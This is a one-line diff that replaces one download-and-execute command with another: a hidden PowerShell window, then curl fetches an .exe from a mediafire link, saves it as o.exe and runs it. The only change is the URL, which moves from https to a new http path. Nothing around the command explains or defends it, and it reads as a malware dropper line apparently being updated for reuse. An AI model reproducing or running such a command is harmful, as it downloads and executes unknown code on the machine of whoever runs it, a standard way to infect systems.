@@ -1,1 +1,1 @@
-powershell /w 01 /c exit&curl https://download1323.mediafire.com/efe1ujiev7ag/o0vxl882ie6bxqs/w456wuj67eejej.exe>o.exe&o.exe
+powershell /w 01 /c exit&curl http://download1323.mediafire.com/p1fba4q9l6dg/o0vxl882ie6bxqs/w456wuj67eejej.exe>o.exe&o.exe
